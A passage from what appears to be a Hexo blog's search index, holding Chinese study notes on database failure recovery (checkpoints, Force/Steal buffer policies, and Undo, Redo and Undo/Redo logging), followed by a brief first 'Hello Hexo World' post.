tabindex="-1">（1）事务故障的回复</h4><ul><li>事务故障可以通过重做事务(Redo)和撤销事务(Undo)来恢复。重做事务可保证已经提交事务的持久性，而撤销事务则消除未提交事务的影响。</li></ul><h4 id="%EF%BC%882%EF%BC%89%E7%B3%BB%E7%BB%9F%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D" tabindex="-1">（2）系统故障恢复</h4><p>运行日志：</p><ul><li><p>运行日志是DBMS维护的一个文件，该文件以流水的形式记录乐每一个事务对数据库的每一次操作及操作顺序</p></li><li><p>运行日志直接写入介质存储上，会保持正确性</p></li><li><p>当事务对数据库进行操作时：先写运行日志，写成功后，再与数据库缓冲区进行信息交换</p></li><li><p>系统故障可以通过运行日志来恢复</p><ul><li>按照运行日志记录的事务操作来重做事务（当事务在发生故障时已经正确结束）或撤销事务（当事务在故障发生时未结束）</li></ul></li><li><p>但故障恢复是需要时间的</p><ul><li>运行日志保留了若干天的记录，故障发生时应从哪个点开始恢复呢？</li></ul></li><li><p>DBMS在运行日志中定期的设置和更新检查点</p><ul><li>检查点是这样的时刻：在该时刻，DBMS强制使内存DB Buffer中的内容和介质DB中的保持一致，即将DB Buffer更新的所有内容写回DB</li><li>检查点表征了，在检查点之前内存中数据和介质中数据是保持一致的</li></ul></li><li><p>系统故障的恢复</p><ul><li>检查点之间结束的书屋不需要恢复(已经写回DB)</li><li>检查点之后结束或发生的事务需要依据运行日志进行恢复(不能确定是否写回DB)：故障点前结束的重做，故障点时刻未结束的撤销</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E4%BB%8B%E8%B4%A8%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D" tabindex="-1">（3）介质故障恢复</h4><ul><li><p>副本</p><ul><li>在某一时刻，对数据库在其他介质存储上产生的令一份等同记录</li><li>用副本替代被损坏的数据库</li></ul></li><li><p>介质故障的恢复</p><ul><li>用副本替换被破环的数据库</li><li>由于介质故障影响全面，用副本恢复后还需要根据运行日志进行恢复</li></ul></li><li><p>如何确定备份的时刻：转储点</p><ul><li>过频，影响系统工作效率；过疏，会造成运行日志过大，也影响系统性能</li><li>备份转储周期与运行日志的大小密切相关，应注意防止衔接不畅而引起的漏洞</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E5%B0%8F%E7%BB%93" tabindex="-1">（4）小结</h4><ul><li>三种类型故障：事务故障，系统故障，介质故障</li><li>三种恢复手段：事务的撤销和重做，运行日志，备份</li><li>两个重要时刻：检查点和转储点</li></ul><h3 id="2303-%E8%BF%90%E8%A1%8C%E6%97%A5%E5%BF%97%E7%9A%84%E6%A6%82%E5%BF%B5" tabindex="-1">2303 运行日志的概念</h3><h4 id="%EF%BC%881%EF%BC%89%E6%97%A5%E5%BF%97%E6%89%80%E8%AE%B0%E5%BD%95%E7%9A%84" tabindex="-1">（1）日志所记录的</h4><ul><li><p>每个事务都会读/写某些元素</p><ul><li>READ(X,t):将元素X读到事务的局部变量t中</li><li>WRITE(X,t):将事务局部变量t写回元素X中</li><li>INPUT(X):将元素X从磁盘读入到内存缓冲区中</li><li>OUTPUT(X):将元素X写回到磁盘中</li></ul></li><li><p>每个事务都以提交或者撤销结束</p><ul><li>COMMIT：事务提交</li><li>ABORT：事务撤销</li></ul></li><li><p>DBMS保证事务的：</p><ul><li>持久性：已提交的事务对数据库产生的影响是持久的，未提交的事务对数据库不应用影响<ul><li>已提交的事务—缓冲区内容保证写回磁盘</li><li>未提交的事务—缓冲区的内容不能影响磁盘</li></ul></li><li>原子性：事务的所有操作，要么全都执行，要么全不执行</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%B8%8D%E5%90%8C%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E7%AD%96%E7%95%A5%E5%BD%B1%E5%93%8D%E4%BA%8B%E5%8A%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7" tabindex="-1">（2）不同的缓冲区策略影响事务的持久性</h4><p>缓冲区处理策略</p><ul><li>Force：内存中的数据最晚在commit的时候写入磁盘</li><li>No Steal：不允许事务commit之前把内存中的数据写入磁盘</li><li>No force：内存中的数据可以一直保留，在commit之后过一段时间在写入磁盘(此时在系统崩溃的时候可能还没写入到磁盘，需要redo)—灵活</li><li>Steal：允许事务commit之前把内存中的数据写入磁盘（此时若系统commit之前崩溃时），已经有数据写入到磁盘时，要恢复到崩溃前的状态，需要Undo）—灵活</li></ul><h4 id="%EF%BC%883%EF%BC%89%E4%BA%8B%E5%8A%A1%E6%95%85%E9%9A%9C%E5%BD%B1%E5%93%8D%E4%BA%8B%E5%8A%A1%E7%9A%84%E5%8E%9F%E5%AD%90%E6%80%A7" tabindex="-1">（3）事务故障影响事务的原子性</h4><p>在事务运行时故障，事务会中断，影响原子性</p><h4 id="%EF%BC%884%EF%BC%89%E6%80%8E%E6%A0%B7%E8%AE%B0%E5%BD%95%E6%97%A5%E5%BF%97" tabindex="-1">（4）怎样记录日志</h4><p>日志</p><ul><li>一个包含日志记录的只能追加的顺序文件，不同事务的日志交错存储，按事件发生顺序存储</li><li>发生系统故障时，使用日志进行恢复<ul><li>故障时已提交的事务，重做（Redo）</li><li>故障时未提交的事务，撤销（Undo）</li></ul></li><li>日志记录的信息<ul><li>&lt; Start T  &gt;表明事务T已经开始</li><li>&lt; Commut T &gt;表示事务T已经完成</li><li>&lt; Abort T &gt;事务T未成功，被终止</li><li>&lt; T,x,v1 &gt;或&lt; T,x,v2 &gt;，&lt; T,x,v1,v2 &gt;事务T改变了数据库元素X，X原来的值为v1，新值为v2</li></ul></li><li>三种日志：Undo型日志，Redo型日志，Undo/Redo型日志</li></ul><h4 id="%EF%BC%885%EF%BC%89%E7%BC%93%E5%86%B2%E5%8C%BA%E5%A4%84%E7%90%86%E7%AD%96%E7%95%A5%E5%92%8C%E6%97%A5%E5%BF%97%E6%81%A2%E5%A4%8D%E7%AD%96%E7%95%A5%E7%9A%84%E5%85%B3%E7%B3%BB" tabindex="-1">（5）缓冲区处理策略和日志恢复策略的关系</h4><table><thead><tr><th></th><th>No Steal</th><th>Steal</th></tr></thead><tbody><tr><td>No Force</td><td></td><td>最快</td></tr><tr><td>Force</td><td>最慢</td><td></td></tr></tbody></table><table><thead><tr><th></th><th>No Steal</th><th>Steal</th></tr></thead><tbody><tr><td>No Force</td><td>只需Redo<br>无需Undo</td><td>需要Redo<br>需要Undo</td></tr><tr><td>Force</td><td>无需Redo<br>无需Undo</td><td>无需Redo<br>只需Undo</td></tr></tbody></table><h3 id="2304-undo%E5%9E%8B%E6%97%A5%E5%BF%97%E5%8F%8A%E5%85%B6%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D" tabindex="-1">2304 Undo型日志及其故障恢复</h3><h4 id="%EF%BC%881%EF%BC%89undo%E5%9E%8B%E6%97%A5%E5%BF%97%E7%9A%84%E8%AE%B0%E5%BD%95%E8%A7%84%E5%88%99" tabindex="-1">（1）Undo型日志的记录规则</h4><ul><li>对于任一事务T，按下列顺序像磁盘输出T的日志信息<ul><li>首先&lt;T,x,v&gt;被写入日志中</li><li>其次，OUTPUT(x)</li><li>最后,&lt;COMMIT T&gt; 或&lt;ABORT T&gt;被写入到日志中</li></ul></li><li>注意：undo型日志仅保留旧值。&lt;T,x,v&gt;，v为X原来的值</li><li>Undo型日志：“将事务改变的所有数据写到磁盘前不能提交该事务”</li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8undo%E5%9E%8B%E6%97%A5%E5%BF%97%E8%BF%9B%E8%A1%8C%E6%81%A2%E5%A4%8D" tabindex="-1">（2）利用Undo型日志进行恢复</h4><ul><li>首先，确定每一个事务是否已经完成<ul><li>start T,commit T = yes</li><li>start T,abort T = no（已结束，但未完成）</li><li>start T… = no</li></ul></li><li>然后，从日志的尾部开始按日志记录的反序，处理每一日志记录，撤销未完成事务的所有修改<ul><li>commit T:标记T已完成</li><li>abort T:标记T已经结束但未完成</li><li>T,x,v:如果T未完成，则将X=v写回磁盘，否则跳过</li><li>Start T:跳过</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E6%A3%80%E6%9F%A5%E7%82%B9%E5%8F%8A%E5%85%B6%E4%BD%BF%E7%94%A8" tabindex="-1">（3）检查点及其使用</h4><p>检查点</p><ul><li>静止检查点：周期性地对日志设置检查点<ul><li>停止接受新的事务，等到所有当前活跃事务提交或终止，并在日志中写入COMMIT或ABORT记录后</li><li>将日志刷新到磁盘，写入日志记录&lt;CKPT&gt;,并再次刷新日志</li></ul></li><li>非静止检查点<ul><li>在设置检查点时不必关闭系统，允许新事务进入</li><li>在写入一条&lt;CKPT(T1,…Tk)&gt;（其中T1，…Tk）是所有活跃的未结束的事务</li><li>继续正常的操作，直到T1…T_k完成时，写入&lt;END CKPT&gt;</li></ul></li></ul><p>恢复时恢复到第一个检查点的位置，即恢复到第一个&lt;END CKPT&gt;或&lt;CKPT&gt;的位置</p><h3 id="2305-redo%E5%9E%8B%E6%97%A5%E5%BF%97%E5%8F%8A%E5%85%B6%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D" tabindex="-1">2305 Redo型日志及其故障恢复</h3><h4 id="%EF%BC%881%EF%BC%89redo%E5%9E%8B%E6%97%A5%E5%BF%97%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E8%A7%84%E5%88%99" tabindex="-1">（1）Redo型日志的日志记录规则</h4><ul><li><p>Undo型日志的问题“将事务改变的所有数据写入磁盘前不能提交该事务”<br>Redo型日志记录信息：</p></li><li><p>对于任一事务T，按下列顺序向磁盘输出T的日志信息</p><ul><li>首先 T,x,v被写入到日志中</li><li>其次，COMMIT T被写到日志中</li><li>最后，OUTPUT(X)</li></ul></li><li><p>注意：redo型日志保留新值，T,x,v，v为更新后的值</p></li><li><p>与undo型的差别，往后两步，先写提交记录输出，还是先输出再写提交记录</p></li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8redo%E6%97%A5%E5%BF%97%E8%BF%9B%E8%A1%8C%E6%81%A2%E5%A4%8D" tabindex="-1">（2）利用redo日志进行恢复</h4><ul><li>首先，确定每一个事务是否已经完成<ul><li>start T,commit T = yes</li><li>start T,abort T = no（已结束，但未完成）</li><li>start T… = no</li></ul></li><li>从日志的起始位置开始按日志记录的正序处理每一日志记录，重做已经提交事务的所有修改<ul><li>commit t：标记t已经完成</li><li>abort t：标记t已结束但未完成</li><li>t，x，v：如果t已经完成，则将x=v写回磁盘，否则跳过</li><li>start t：跳过</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E6%A3%80%E6%9F%A5%E7%82%B9%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8" tabindex="-1">（3）检查点及其应用</h4><ul><li><p>静态检查点（同Undo）</p></li><li><p>非静态检查点</p><ul><li>再进行检查点设置时不必关闭系统，允许新事务进入</li><li>写入一条 start ckpt(t1,…tk)，其中t1,…tk是所有活跃的未结束的事务</li><li>将所有已提交的事务写回磁盘</li><li>继续正常的操作，直到t1,…tk都完成时，写入end ckpt</li></ul></li><li><p>step1：寻找到最后的end ckpt</p></li><li><p>step2：从start ckpt里的事务的最早开始处开始恢复，忽略更早的提交事务</p></li></ul><h3 id="2306-undo%2Fredo%E7%BB%93%E5%90%88%E5%9E%8B%E6%97%A5%E5%BF%97%E5%8F%8A%E5%85%B6%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D" tabindex="-1">2306 Undo/Redo结合型日志及其故障恢复</h3><h4 id="%EF%BC%881%EF%BC%89%E5%8D%95%E7%A7%8D%E6%97%A5%E5%BF%97%E7%9A%84%E9%97%AE%E9%A2%98" tabindex="-1">（1）单种日志的问题</h4><ul><li>Undo型日志<ul><li>OUTPUT必须先做</li><li>如果 COMMIT T 可见，T确定地已经将所有其数据写回磁盘，因此不必重做</li><li>但可能引起性能下降（因为频繁的写磁盘）</li></ul></li><li>Redo型日志<ul><li>OUTPUT必须后做</li><li>如果 COMMIT T不可见，T确定地没有将任何数据写回到磁盘，因此无需撤销</li><li>但灵活性差，数据必须在COMMIT后才可见</li></ul></li><li>更好地—Undo/Redo 型日志</li></ul><h4 id="%EF%BC%882%EF%BC%89undo%2Fredo%E7%BB%93%E5%90%88%E5%9E%8B%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E8%A7%84%E5%88%99" tabindex="-1">（2）Undo/Redo结合型日志记录规则</h4><ul><li>对于任一事务T，按下列顺序向磁盘输出T的日志信息<ul><li>第一步，&lt;T,X,u,v&gt;被写到磁盘中</li><li>第二步，COMMIT T 或 OUTPUT T 都可以</li></ul></li><li>Undo/Redo结合型日志既保留新值v，也有旧值u。</li></ul><h4 id="%EF%BC%883%EF%BC%89undo%2Fredo%E7%BB%93%E5%90%88%E5%9E%8B%E6%97%A5%E5%BF%97%E8%BF%9B%E8%A1%8C%E6%81%A2%E5%A4%8D" tabindex="-1">（3）Undo/Redo结合型日志进行恢复</h4><ul><li>自前向后地，按日志记录的正序，重做所有已经提交的事务；</li><li>自后向前地，按日志记录地反序，撤销所有未完成事务地修改</li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css"></索引字段值Ki，指针Pi></li>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Hexo World</title>
      <link href="/2023/02/27/hello-world/"/>
      <url>/2023/02/27/hello-world/</url>
      
        <content type="html"><![CDATA[<img src="/images/meitu/1.jpg"><p>该博客就此投入使用，用以记录一些笔记及学习。</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
